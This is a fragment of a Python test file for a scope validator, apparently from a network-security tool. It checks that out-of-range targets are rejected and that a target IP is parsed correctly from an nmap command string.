        """validate: ScopeViolationError is re-raised (branch 708->719)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        # This should raise ScopeViolationError which is then re-raised at line 758
        with pytest.raises(ScopeViolationError):
            validator.validate(target="10.0.0.1")  # Out of scope

    def test_parse_flag_with_next_arg_starts_with_dash(self):
        """Command parsing: flag followed by another flag (not a value)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        # --foo followed by -v (another flag) - should skip --foo and process -v
        target, port, protocol = validator._parse_target_from_command("nmap --foo -v 192.168.1.1")
        assert target == "192.168.1.1"



